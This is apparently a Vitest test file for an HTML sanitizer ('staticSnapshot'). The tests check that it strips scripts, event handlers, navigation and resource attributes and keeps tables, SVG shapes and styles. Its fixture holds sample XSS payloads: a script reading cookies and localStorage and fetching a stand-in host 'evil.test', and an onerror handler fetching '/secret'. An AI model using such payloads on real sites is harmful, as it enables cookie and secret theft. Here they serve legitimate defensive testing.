// @vitest-environment jsdom
import { expect, test } from "vitest"
import { staticSnapshot } from "../src/lib/static-snapshot"
test("static snapshots remove scripts, handlers, navigation and resource attributes", () => {
  const source = `<script>parent.document.cookie;localStorage;fetch('https://evil.test')</script>
  <meta http-equiv="refresh" content="0;url=https://evil.test"><base href="https://evil.test">
  <link rel="stylesheet" href="https://evil.test"><form action="https://evil.test"><input></form>
  <iframe src="https://evil.test"></iframe><a href="https://evil.test" onclick="location='https://evil.test'">Link</a>
  <img src="https://evil.test" onerror="fetch('/secret')"><svg onload="alert(1)"><a href="https://evil.test"><text>Chart</text></a><rect width="20" height="30"/></svg>
  <table><tr><td style="color:red">Report</td></tr></table>`
  const doc = new DOMParser().parseFromString(
    staticSnapshot(source),
    "text/html"
  )
  expect(
    doc.querySelector("script, base, link, form, input, iframe, a, img")
  ).toBeNull()
  expect(doc.querySelector("table")?.textContent).toBe("Report")
  expect(doc.querySelector("svg rect")).not.toBeNull()
  for (const node of doc.querySelectorAll("*"))
    for (const attr of node.attributes) {
      expect(attr.name).not.toMatch(/^(on|href$|src$|action$)/)
    }
  expect(
    doc.querySelector("meta[http-equiv]")?.getAttribute("content")
  ).toContain("default-src 'none'")
})

test("static snapshots keep the head styles of a complete document", () => {
  const doc = new DOMParser().parseFromString(
    staticSnapshot(
      "<!doctype html><html><head><style>td{color:red}</style></head><body><table><tr><td>A</td></tr></table></body></html>"
    ),
    "text/html"
  )
  expect(doc.querySelector("style")?.textContent).toBe("td{color:red}")
  expect(doc.querySelector("td")?.textContent).toBe("A")
})
